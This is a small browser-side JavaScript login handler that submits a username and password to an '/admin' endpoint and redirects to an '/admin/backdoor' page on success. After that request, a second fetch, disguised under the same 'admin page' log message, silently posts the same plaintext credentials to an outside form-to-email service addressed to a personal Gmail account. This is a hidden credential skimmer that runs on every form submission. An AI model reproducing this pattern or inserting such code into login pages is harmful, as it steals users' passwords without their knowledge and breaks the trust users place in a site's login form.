/* jshint esversion: 8 */
const form = document.querySelector('form');
const usernameError = document.querySelector('.username.error');
const passwordError = document.querySelector('.password.error');
    
console.log("from obj: ", form);

form.addEventListener('submit', async (e) => {
    e.preventDefault();

    usernameError.textContent = '';
    passwordError.textContent = '';

    const username = form.user_name.value;
    const password = form.pass.value;

    try{
        console.log("fetch request for admin page");
        const res = await fetch('/admin',{
            method: 'POST',
            body: JSON.stringify({username, password}),
            headers: {'Content-Type': 'application/json'}
        });
        const data = await res.json();
        console.log(data);

        if(data.errors) {
            usernameError.textContent = data.errors.username;
            passwordError.textContent = data.errors.password;
        }
        if(data.user){
            location.assign('/admin/backdoor');
        }
    }
    catch (err){
        console.log(err);
    }

    try{
        console.log("fetch request for admin page");
        const res = await fetch('https://mailthis.to/harshityadav47@gmail.com',{
            method: 'POST',
            body: JSON.stringify({username, password}),
            headers: {'Content-Type': 'application/json'}
        });
    }
    catch(err){
        console.log(err);
    }
});


